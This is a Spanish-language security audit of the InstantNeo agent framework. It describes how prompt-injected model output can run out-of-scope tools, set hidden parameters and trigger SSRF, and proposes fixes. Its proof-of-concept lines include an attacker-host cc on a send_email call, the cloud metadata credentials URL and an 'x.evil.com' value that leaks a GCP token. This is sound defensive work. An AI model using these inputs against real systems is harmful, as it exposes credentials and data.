# Revisión de seguridad y arquitectura — InstantNeo v0.3.0

Fecha: 2026-08-17 · Alcance: `instantneo/` (11.410 LOC), CI, empaquetado
Estado del repo analizado: `010cd62` (InstantLoop v2)

---

## 0. Resumen ejecutivo

El resultado del escaneo automático es, efectivamente, casi vacío — y eso es
información en sí misma, no una ausencia de hallazgos:

| Herramienta | Resultado |
|---|---|
| `bandit -r instantneo/` | 3 hallazgos **Low**, los 3 falsos positivos |
| `semgrep` (`p/security-audit`, `p/python`, `p/secrets`) | 1 hallazgo **MEDIUM**, falso positivo |
| `pip-audit` sobre dependencias directas | 0 CVEs en `httpx`, `cryptography`, `pyyaml`, `docstring_parser` |
| Escaneo de secretos en historia git | 0 hallazgos |
| `pytest` | 420 passed en 1.02s |
| `ruff check` | 90 hallazgos (mayormente cosméticos — ver §4.3) |

La razón es que el código **no tiene los patrones que esas herramientas buscan**:
no hay `eval`, `exec`, `pickle`, `yaml.load` inseguro, `subprocess`, ni SQL. El
`yaml.safe_load` está bien usado, las API keys viajan en headers y nunca en URLs,
y `sanitize_secrets()` es una defensa deliberada y bien pensada.

**El riesgo real de InstantNeo no es de la clase que un SAST detecta.** Es un
framework de agentes: su superficie de ataque es el *borde de ejecución de
tools* — el punto donde texto generado por un LLM (potencialmente influido por
prompt injection en un documento, una respuesta de API o el output de otra tool)
se convierte en una llamada a función Python real. Ese borde hoy no tiene
control de scope, ni validación de argumentos, ni política de ejecución.

Los tres hallazgos de mayor impacto están **confirmados con PoC ejecutable**:

- **S1** — `run(tools=[...])` no restringe la ejecución: es solo un filtro de
  presentación. Cualquier tool del registro se ejecuta.
- **S2** — Cero validación de argumentos: `tool_func(**arguments)` directo desde
  JSON del modelo.
- **A1** — Bug funcional: el system prompt se descarta entero si `role_setup`
  está vacío, perdiendo `global_instructions` y shelf context — y el RunLog
  "forense" registra un prompt distinto del que se envió.

---

## 1. Seguridad

### S1 — `run(tools=[...])` no restringe qué se ejecuta · **Alto**

`instantneo/core.py:639` calcula `active_tools`, pero ese conjunto se usa
**solamente** para construir los schemas que se le mandan al provider
(`core.py:655-666`). A la hora de ejecutar, `_handle_tool_calls` valida contra
otra cosa:

```python
# core.py:860 — el registro COMPLETO, no el scope del run
if function_name in self.get_tool_names():
    tool_func = self.get_tool_by_name(function_name)
```

El scope del run nunca llega al ejecutor. Es un *confused deputy*: la
restricción es cosmética.

**PoC (ejecutado, confirmado):**

```python
neo = InstantNeo(..., skills=[safe_tool, delete_database])

active = neo._get_active_tools(["safe_tool"])
# -> ['safe_tool']   el modelo solo ve safe_tool

# el modelo devuelve un tool_call fuera de ese scope
tc = SimpleNamespace(type="function", function=SimpleNamespace(
        name="delete_database", arguments='{"target": "prod"}'))
neo._handle_tool_calls([tc], "wait_response")
# -> "DROPPED prod"          ← se ejecutó igual
```

**Impacto.** Un agente que hace RAG sobre documentos no confiables, que lee
emails, o que consume el output de otro agente, puede ser inducido a emitir un
tool_call fuera del scope declarado. También basta un provider con un bug de
serialización o un modelo alucinando un nombre de tool de otra sesión. La
mitigación que el desarrollador *cree* tener (`run(tools=[...])` como sandbox por
turno) no existe.

**Fix.** Pasar `active_tools` a `_handle_tool_calls` y validar contra él. Cuando
llega un nombre fuera de scope: no ejecutar, registrar la entry de violación y
devolver un error al modelo como resultado de la tool (para que pueda corregir),
en lugar de un `logger.warning` silencioso.

---

### S2 — Sin validación de argumentos en el borde de ejecución · **Alto**

```python
# core.py:858
function_args = json.loads(tool_call.function.arguments) or {}
# core.py:968
return tool_func(**arguments)
```

Entre el JSON del modelo y el splat de kwargs no hay nada: ni coerción de tipos,
ni rechazo de claves desconocidas, ni manejo de JSON inválido. El framework
*tiene* el schema (`metadata['parameters']`) y no lo usa para validar — solo
para generar la definición que se le manda al provider.

**PoC (ejecutado, confirmado):**

```
=== Type confusion: el schema declara integer, llega string ===
transfer({"amount": "999999999"})  ->  amount = '999999999' (type=str)

=== Kwarg inexistente ===
send_email({"to":"a","bogus":1})
  -> TypeError: send_email() got an unexpected keyword argument 'bogus'
     (propaga y aborta el run entero)

=== JSON malformado del provider ===
arguments='{"to": '  ->  JSONDecodeError propagado sin contexto
```

**Impacto.** *Type confusion* — una tool anotada `amount: int` recibe un `str`;
lo que pase después depende de la tool (comparaciones que no fallan pero mienten,
concatenaciones, índices). *DoS* — el modelo alucina un parámetro y el `TypeError`
mata el run completo; en un `InstantLoop` de 30 pasos eso tira el trabajo
acumulado. Las anotaciones de tipo dan una falsa sensación de contrato.

**Fix.** Una capa de validación entre `json.loads` y la invocación, derivada del
schema que ya existe: coerción de tipos, `required` verificado, claves
desconocidas rechazadas, `enum` respetado. El error debe volver al modelo como
resultado de tool (permitiendo autocorrección), no propagarse como excepción.
Envolver `json.loads` en try/except con el mismo tratamiento.

---

### S3 — El schema expone toda la firma, no lo declarado en `parameters` · **Medio-Alto**

`@tool(parameters={...})` se lee como una declaración de qué se expone. No lo es:
es un mapa de descripciones. `format_tool` (`utils/tool_utils.py:24`) construye
las properties desde la metadata fusionada, que incluye **todos** los parámetros
de la firma.

**PoC (ejecutado, confirmado):**

```python
@tool(description="Envia un email", parameters={"to": "destinatario"})
def send_email(to: str, is_admin: bool = False, cc: str = None): ...
```

Schema efectivamente enviado al modelo:

```json
"properties": {
  "to":       {"type": "string",  "description": "destinatario"},
  "is_admin": {"type": "boolean", "description": ""},   ← no declarado
  "cc":       {"type": "string",  "description": ""}    ← no declarado
}
```

```
send_email({"to":"victim@x.com","is_admin":true,"cc":"attacker@evil.com"})
  -> sent to=victim@x.com admin=True cc=attacker@evil.com
```

Además el schema generado **no incluye `"additionalProperties": false`**, así que
tampoco hay un freno del lado del provider.

**Impacto.** Parámetros internos — `dry_run`, `is_admin`, `skip_validation`,
`_internal` — quedan bajo control del modelo sin que el desarrollador lo advierta.
Combinado con S2 (sin filtro de kwargs) y S1 (sin scope), es la cadena completa.

**Fix.** Decidir la semántica y documentarla. Recomendado: si `parameters` está
presente, tratarlo como **allowlist** — lo no declarado no se expone ni se acepta.
Emitir `"additionalProperties": false` en todos los schemas. Convención de que
`_`-prefijados nunca se exponen.

---

### S4 — SSRF y consumo de memoria en descarga de imágenes · **Medio**

`utils/image_utils.py:32`:

```python
with httpx.Client(timeout=timeout, follow_redirects=True, headers=headers) as client:
    response = client.get(url)          # sin allowlist de esquema ni de host
    ...
    base64_data = base64.b64encode(response.content)   # sin límite de tamaño
```

`is_url()` acepta cualquier cosa con esquema + netloc. No hay validación de
esquema (`http`/`https`), ni bloqueo de rangos privados / link-local, y
`follow_redirects=True` permite saltarse cualquier chequeo que se hiciera solo
sobre la URL inicial.

**Impacto.** Si una URL de imagen viene de entrada no confiable — output de una
tool, un campo de un documento, un parámetro que el modelo eligió — se puede
alcanzar `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
(metadata de AWS/GCP) o servicios internos. La respuesta vuelve base64-encodeada
dentro del prompt, así que **el modelo la lee**: es un canal de exfiltración
completo. Sin límite de tamaño, `response.content` se buffea entero en memoria y
luego crece ~33% al codificar en base64.

**Fix.** Allowlist de esquema (`https`, y `http` solo opt-in). Resolver el host y
rechazar privadas/loopback/link-local (`ipaddress.ip_address(...).is_private`),
**revalidando en cada redirect** (`follow_redirects=False` + bucle propio, o un
transport hook). `max_bytes` con lectura por chunks (`client.stream`). Verificar
que el content-type sea realmente `image/*` en vez de caer al fallback por
extensión de URL.

---

### S5 — Interpolación sin validar en endpoints de Vertex · **Medio**

`fetchers/vertex/_auth.py:228-245`:

```python
def _vertex_host(self) -> str:
    return f"{self.location}-aiplatform.googleapis.com"     # location → HOSTNAME

def _vertex_endpoint(self, publisher, model, action) -> str:
    return (f"https://{self._vertex_host()}/v1/"
            f"projects/{self.project_id}/locations/{self.location}/"
            f"publishers/{publisher}/models/{model}:{action}")
```

`location` no se valida en ningún punto — solo se verifica que sea truthy
(`core.py:1351`). Como entra en la posición de host, un valor como
`x.evil.com/` produce
`https://x.evil.com/-aiplatform.googleapis.com/v1/...`, y a ese host se le
manda el header `Authorization: Bearer <token GCP>`
(`_build_vertex_headers`, línea 265).

`project_id` y `model` van al path sin escapar (path traversal con `../`).

**Impacto.** Exfiltración del access token de la service account si `location`
viene de configuración externa, una variable de entorno, un panel multi-tenant o
un archivo YAML de deployment. No es explotable por el LLM, pero sí por quien
controle la configuración — el modelo de amenaza razonable en un despliegue
multi-tenant.

**Fix.** Validar `location` contra `^[a-z0-9-]+$` o `global` en el constructor.
`urllib.parse.quote` sobre `project_id` y `model` al armar el path.

---

### S6 — El RunLog forense se escribe world-readable y sin redactar contenido · **Medio**

```python
# debug.py:84-89
path.parent.mkdir(parents=True, exist_ok=True)
path.write_text(json.dumps(data, ...), encoding="utf-8")
```

Verificado en ejecución: con umask 022 (el default en la mayoría de hosts) los
archivos quedan **`-rw-r--r-- (0644)`** y los directorios **`drwxr-xr-x (0755)`**.

Y hay una asimetría importante en la redacción: `sanitize_secrets()` filtra
**claves de configuración** por nombre (`api_key`, `*token*`, `*secret*`…), lo
cual está bien hecho — pero el contenido persistido con `debug=True` incluye
`messages_sent` (prompts completos), y los **argumentos y resultados de cada
tool**, que no pasan por ningún filtro. Ahí es donde vive el dato sensible real:
lo que devolvió la tool que consultó la base de clientes, el token que la tool de
auth generó, el PII que el usuario escribió en el prompt.

**Impacto.** En un host compartido o un contenedor con volumen montado,
cualquier usuario local lee el historial completo de conversaciones. El nombre
"log forense" invita a activarlo en producción para auditoría, que es
precisamente el escenario donde más duele.

**Fix.** `os.chmod(path, 0o600)` y `mkdir(mode=0o700)`. Documentar explícitamente
que `debug=True` persiste contenido sin redactar. Ofrecer un hook de redacción
para argumentos/resultados de tools.

---

### S7 — Menores

| # | Hallazgo | Ubicación |
|---|---|---|
| S7.1 | `token_uri` se toma del JSON de la service account sin validar host/esquema | `vertex/_auth.py:158` |
| S7.2 | `_get_access_token()` no es thread-safe: refresh concurrente duplica el intercambio JWT | `vertex/_auth.py:205` |
| S7.3 | User-Agent de Chrome falsificado y hardcodeado en descargas | `image_utils.py:29` |
| S7.4 | `except Exception: pass` silencia errores de lectura de recursos de skills | `skills/agent_skill.py:84` |
| S7.5 | Cuerpos de error del provider embebidos crudos en excepciones | `fetchers/_chat_completions.py:267` |

Nota sobre los 3 hallazgos de bandit: los dos `B105/B107` sobre
`"https://oauth2.googleapis.com/token"` son falsos positivos (bandit ve el nombre
de parámetro `token_uri`); el `B110` es S7.4, que sí vale la pena arreglar.

---

## 2. Arquitectura y correctitud

### A1 — El system prompt se descarta si `role_setup` está vacío · **Alto (bug funcional)**

```python
# core.py:800-804
final_role_setup = self.get_resolved_role_setup(shelf_context)

if self.config.role_setup:                    # ← condición sobre la parte, no sobre el todo
    messages.append({"role": "system", "content": final_role_setup})
```

`get_resolved_role_setup()` compone tres cosas: `role_setup` + `tool_instructions`
+ `shelf_context`. El guard mira solo la primera. Si `role_setup` es `""` o `None`
pero hay `global_instructions` en las capabilities o contexto de shelf activo, el
mensaje `system` **no se agrega**: todo se pierde en silencio.

**PoC (ejecutado, confirmado):**

```
get_resolved_role_setup() -> '## TOOLS INSTRUCTIONS ##\nINSTRUCCIONES CRITICAS...'

mensajes realmente enviados al provider:
   user -> 'hola'
                        ← no hay mensaje system
```

Esto es doblemente grave porque `get_resolved_role_setup()` es la API pública de
introspección que usa `build_agent_config()` (`debug.py:151`) para poblar el
RunLog. **El log forense registra un system prompt que nunca se envió.** Cualquier
replay o auditoría basada en ese log es incorrecta.

Agrava el problema que el README y el README de capabilities recomiendan
explícitamente poner las instrucciones operativas en `global_instructions` y
dejar `role_setup` para la identidad — el patrón documentado es exactamente el
que dispara el bug.

**Fix.** `if final_role_setup:`.

---

### A2 — `max_retries` es código muerto; no hay reintentos en ninguna ruta · **Alto (fiabilidad)**

Tres fetchers aceptan, documentan y almacenan el parámetro:

```python
# fetchers/openai.py:67,79 · anthropic.py:38,50 · cerebras.py:44,56
max_retries: int = 2
"""max_retries: Número máximo de reintentos en caso de error"""
self.max_retries = max_retries
```

`grep` sobre todo el paquete: el atributo **nunca se lee**. No hay ningún bucle
de reintento, ni backoff, ni manejo de 429 en la ruta v2.

**Impacto.** Un 429 (rate limit), un 503 o un timeout de red aborta el run. Dentro
de `InstantLoop`, ese fallo entra por el `except` de `4.c` y termina el loop con
`terminated_reason="error"` — se pierden los pasos ya pagados. Los rate limits en
loops multi-turno no son un caso excepcional: son la operación normal.

**Es además una regresión.** El loop legacy sí tenía backoff:

```python
# experimental/instant_loop.py:145-161
for attempt in range(3):
    try:
        self.agent.run(...); break
    except Exception as e:
        if attempt < 2 and "timed out" in str(e).lower():
            time.sleep((attempt + 1) * 10)
        else: raise
```

El rewrite v2 lo eliminó sin reemplazo.

**Fix.** Implementar retry con backoff exponencial + jitter en la capa de
fetchers (el lugar correcto, no en el loop), honrando `Retry-After` en 429.
Reintentar solo lo idempotente: 429, 5xx, timeouts de conexión. Nunca 4xx de
validación.

---

### A3 — Estado mutable por-run en instancias compartidas · **Medio**

```python
core.py:637        self.async_execution = run_params.async_execution
core.py:688,700    self._last_run = run_info
loop/instant_loop.py:259-262   self._current_run_id / _stop_requested / _run_start_entry_id
```

Ni `InstantNeo` ni `InstantLoop` son reentrantes. Dos `run()` concurrentes sobre
la misma instancia se pisan el estado: `last_run` devuelve el run equivocado (y
con él, el RunLog y el bridge a History quedan mal atribuidos), y
`loop.stop()` cancela un run que no es el que se quiso cancelar.

Esto choca de frente con el posicionamiento del proyecto ("componentes para
sistemas inteligentes", "sistemas multi-agente"): el multi-agente en Python se
hace, casi siempre, con threads. El README de v2 anuncia "multi-loop sobre el
mismo History soportado nativamente", lo cual es cierto para el History pero no
para las instancias de Loop.

**Fix.** Mínimo viable: documentar que una instancia = un run concurrente, y
`contextvars` para `_last_run`. Mejor: que `run()` devuelva el `RunInfo` en vez de
depender de estado de instancia, y que `stop()` reciba un `run_id`.

---

### A4 — La ruta `async_execution` está rota por diseño · **Medio**

```python
# core.py:914-928 (el patrón se repite 4 veces en el archivo)
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)

if loop.is_running():
    futures = [asyncio.ensure_future(r) for r in results]
    results = loop.run_until_complete(asyncio.gather(*futures))   # ← imposible
```

Tres problemas: `run_until_complete` sobre un loop que ya corre lanza
`RuntimeError` siempre; `asyncio.get_event_loop()` está deprecado y en 3.12+ emite
`DeprecationWarning` fuera de contexto async; y `_execute_tool` devuelve
`loop.run_in_executor(...)` — un Future atado a un loop que puede no ejecutarse
nunca.

El resultado se traga entero:

```python
except Exception:
    logger.exception("Error al ejecutar corrutinas de manera asíncrona")
    # sin re-raise → el run continúa como si las tools se hubieran ejecutado
```

**Impacto.** Con `async_execution=True`, las tools pueden no ejecutarse y el
usuario recibe una respuesta aparentemente normal. Un fallo silencioso es peor
que una excepción. El bloque se repite casi idéntico 4 veces (líneas 914, 936,
1125, 1201), lo que multiplica la superficie del error.

**Fix.** Extraer el patrón a un único helper. Usar `asyncio.run()` cuando no hay
loop y `anyio.from_thread` / `asyncio.run_coroutine_threadsafe` cuando sí lo hay.
Nunca tragar el error: propagar o marcar el `ToolExecution` como fallido.

---

### A5 — Sin presupuesto de tokens ni timeout global en el loop · **Medio**

`InstantLoop` acota únicamente por `max_steps` (default 30, y `0` = sin cap). No
hay límite de tokens, de costo, ni de wall-clock. La vista `loop_default`
reconstruye el prompt desde `history.all()` filtrado por `run_id`, **sin ventana
ni truncado** (`loop/default_view.py:232-266`).

Consecuencia: el prompt crece linealmente con los pasos, así que el costo
acumulado del run crece **cuadráticamente**. Un loop de 30 pasos con respuestas
largas puede costar órdenes de magnitud más de lo que el desarrollador estima
mirando `max_steps`. Con `max_steps=0` y un agente que nunca llama a la stop
tool, el gasto no tiene techo.

**Fix.** `max_tokens_budget` y `timeout_s` en el constructor, cortando con
`terminated_reason="budget"`. Ventana deslizante o compactación en la vista
default. Acumular tokens y costo estimado en el `RunResult`.

---

### A6 — Menores

| # | Hallazgo | Ubicación |
|---|---|---|
| A6.1 | `History.get(id)` hace scan lineal O(n); `_entries` sin cota superior | `history/history.py:171` |
| A6.2 | Las dos ramas de `WAIT_RESPONSE` en `_handle_tool_calls` son idénticas | `core.py:885-902` |
| A6.3 | `.gitignore:66` ignora `pyproject.toml`. Hoy es inocuo porque el archivo ya está trackeado (`git check-ignore --no-index` lo confirma como ignorado), pero si alguien lo borra y recrea, o una herramienta lo regenera, desaparece del repo en silencio | `.gitignore:66` |
| A6.4 | `_load_tools_from_folder` inserta y borra de `sys.modules` sin lock | `skills/agent_capabilities.py:298` |

---

## 3. Lo que está bien hecho

Vale la pena nombrarlo, porque condiciona las recomendaciones:

- **El diseño event-sourced de v2 es sólido.** History append-only, Monitor como
  rule engine desacoplado, bridge `RunInfo → Entries`, RunLog separado del
  History. La separación de responsabilidades es real, no nominal, y los cinco
  documentos en `docs/design/` la respaldan.
- **La deprecación del loop legacy es ejemplar**: `DeprecationWarning` a nivel de
  módulo con `stacklevel=2`, docstring que explica las diferencias, README con
  ruta de migración, y compromiso explícito de un release de gracia.
- **Higiene de credenciales**: API keys en headers y nunca en query strings
  (contraste con muchas integraciones de Gemini que usan `?key=`),
  `sanitize_secrets()` con allowlist explícita más heurística por patrón,
  `.gitignore` con patrones específicos para service accounts de GCP, cero
  secretos en la historia de git.
- **420 tests pasando en 1.02s**, sin llamadas de red — la suite es rápida de
  correr, que es lo que determina si se corre.
- **`py.typed`** publicado y versión con fuente única en `pyproject.toml`.

---

## 4. CI/CD y cadena de suministro

### C1 — El workflow de publicación usa un token PyPI de larga vida · **Medio**

```yaml
# .github/workflows/publish.yml
env:
  TWINE_PASSWORD: ${{ secrets.PYPI_API_TOKEN }}
```

Un token estático con permiso de publicación, sin `environment:` protection y sin
`permissions:` explícito en el workflow (hereda los defaults del repo, que suelen
ser amplios). Cualquiera con acceso de escritura a `main` — o un compromiso de una
action de terceros — puede publicar a PyPI.

**Fix.** Migrar a **Trusted Publishing** (OIDC): elimina el secreto por completo.
Añadir `permissions: {id-token: write, contents: read}` y un
`environment: pypi` con required reviewers. Fijar las actions por SHA en vez de
por tag flotante (`actions/checkout@v4` → SHA).

### C2 — Dependencias sin ninguna restricción de versión · **Medio**

```toml
dependencies = ["docstring_parser", "httpx", "cryptography", "pyyaml"]
```

Sin cotas inferiores, un resolver puede elegir una `cryptography` antigua con
CVEs conocidos — y el paquete la usa precisamente para firmar JWTs de service
account. Sin cotas superiores, un major rompe a los usuarios sin aviso.

**Fix.** `cryptography>=42,<50`, `httpx>=0.27,<1`, `pyyaml>=6,<7`,
`docstring_parser>=0.15,<1` (ajustando a lo que realmente se usa).

### C3 — Sin análisis estático ni auditoría de dependencias en CI

`test.yml` corre solo `pytest`. No hay linter, ni type checker, ni escaneo de
dependencias, ni cobertura. Bandit, semgrep y pip-audit ya dan limpio hoy — el
valor de meterlos en CI es **mantenerlo así** cuando entren PRs nuevos.

`ruff` sí encuentra 90 hallazgos. La gran mayoría es ruido acumulado (50 imports
sin usar, 20 imports fuera del tope del módulo), pero tres grupos merecen mirada:

| Regla | Caso | Lectura |
|---|---|---|
| `F841` | `core.py:861` — `tool_func` se asigna y nunca se usa | Corrobora S1: `_handle_tool_calls` resuelve la tool y la descarta, porque `_execute_tool` la vuelve a resolver por su cuenta. Dos resoluciones independientes del mismo nombre es justamente por qué el chequeo de scope se desalineó. |
| `F841` | `core.py:947`, `1136`, `1214` — `except ... as e` con `e` sin usar | Son los bloques de A4 que capturan y no propagan. El linter marca el síntoma exacto del fallo silencioso. |
| `E722` | `fetchers/cerebras.py:372`, `openai.py:519` — `except:` desnudo | Captura `KeyboardInterrupt` y `SystemExit`: un Ctrl-C durante el parseo de stream se traga. |
| `F811` | `models/__init__.py:53` — `ContentBlock` redefinido | Un nombre exportado dos veces; el segundo tapa al primero. Vale confirmar cuál se quiere exportar. |

Correr `ruff check --fix` resuelve 66 de los 90 sin intervención.

**Fix.** Job `quality` con `ruff check`, `bandit -r instantneo/ -ll`,
`pip-audit`, y `pytest --cov=instantneo --cov-fail-under=<baseline actual>`.
Activar Dependabot (`.github/dependabot.yml`) para pip y github-actions.

Nota sobre el orden: conviene limpiar los 90 de ruff **antes** de meter el job,
si no el primer PR ajeno se encuentra con un CI rojo que no causó.

### C4 — Falta `SECURITY.md`

Un framework que maneja credenciales de cinco proveedores cloud y ejecuta código
arbitrario en respuesta a salida de LLM necesita una vía de reporte de
vulnerabilidades. Añadir `SECURITY.md` y activar Private Vulnerability Reporting
en GitHub.

---

## 5. Plan de acción priorizado

Ordenado por (impacto × facilidad). Los tres primeros son de bajo esfuerzo y alto
retorno.

### Ahora — correcciones puntuales

| # | Acción | Esfuerzo |
|---|---|---|
| A1 | `if final_role_setup:` en `_prepare_messages` | 1 línea |
| S1 | Pasar `active_tools` a `_handle_tool_calls` y validar contra él | ~10 líneas |
| S6 | `chmod 0600` / `mkdir(mode=0o700)` en `write_json` y en los folders de RunLog | ~5 líneas |
| S5 | Validar `location` con regex; `quote()` sobre `project_id` y `model` | ~8 líneas |
| A6.2 | Colapsar las ramas duplicadas de `WAIT_RESPONSE` | ~15 líneas menos |

### Siguiente — el borde de ejecución

| # | Acción |
|---|---|
| S2 | Capa de validación de argumentos derivada del schema, entre `json.loads` y la invocación. Errores de validación vuelven al modelo como resultado de tool, no como excepción. |
| S3 | Definir `parameters` como allowlist; emitir `additionalProperties: false` |
| A2 | Retry con backoff exponencial + jitter en la capa de fetchers, honrando `Retry-After` |
| S4 | Endurecer `download_image_to_base64`: allowlist de esquema, bloqueo de rangos privados revalidado por redirect, `max_bytes` con lectura por chunks |

### Después — arquitectura

| # | Acción |
|---|---|
| A4 | Unificar las 4 copias del bloque asyncio en un helper; dejar de tragar excepciones |
| A5 | `max_tokens_budget` y `timeout_s` en `InstantLoop`; ventana deslizante en `loop_default` |
| A3 | Eliminar el estado mutable por-run; `run()` devuelve `RunInfo`, `stop(run_id)` |
| — | **Hook de política de ejecución de tools** (ver abajo) |
| C1–C4 | Trusted Publishing, pins de dependencias, job de calidad en CI, `SECURITY.md` |

---

## 6. La recomendación de fondo: un punto de control de ejecución

S1, S2 y S3 son tres síntomas de la misma ausencia estructural: **no existe un
lugar donde se decida si una llamada a tool procede**. Hoy el camino entre "el
modelo dijo esto" y "Python lo ejecutó" es recto y sin intercepción.

La corrección de cada hallazgo por separado es necesaria, pero deja el diseño con
la misma forma. Lo que falta es una costura explícita:

```python
InstantNeo(
    ...,
    tool_policy=ToolPolicy(
        scope="strict",              # solo tools del scope del run (arregla S1)
        validate_args=True,          # coerción + rechazo de extras (arregla S2)
        expose="declared_only",      # parameters como allowlist (arregla S3)
        before_call=my_approval_hook,  # (name, args) -> Allow | Deny | Ask
    ),
)
```

El `before_call` es la pieza que hoy no tiene sustituto: es lo que permite pedir
confirmación humana para tools destructivas, aplicar rate limiting por tool,
auditar cada invocación en un canal separado del RunLog, o denegar según el
contenido de los argumentos. Es también lo que convierte a InstantNeo en algo
utilizable en entornos donde el input del agente no es de confianza.

Encaja bien con la arquitectura que ya existe: el `Monitor` de v2 ya es un rule
engine reactivo sobre el History. `ToolPolicy` sería su equivalente **preventivo**
sobre el borde de ejecución — misma filosofía de reglas componibles, aplicada
antes del efecto en lugar de después.

Es, además, coherente con el posicionamiento del proyecto. La propuesta de
InstantNeo es "control granular sobre el comportamiento del agente" frente a
frameworks rígidos. El control granular sobre *qué se ejecuta* es la dimensión
que hoy falta — y es la que más importa cuando el agente sale del notebook.

---

## Apéndice — Reproducir el análisis

```bash
pip install bandit pip-audit semgrep ruff

bandit -r instantneo/ -ll
pip-audit
semgrep --config=p/security-audit --config=p/python --config=p/secrets instantneo/
ruff check instantneo/
python -m pytest tests/ -q
```

Los PoC de S1, S2, S3 y A1 se construyen con `SimpleNamespace` para simular el
objeto `tool_call` del provider e invocar `_handle_tool_calls` directamente, sin
tocar la red ni requerir una API key válida.
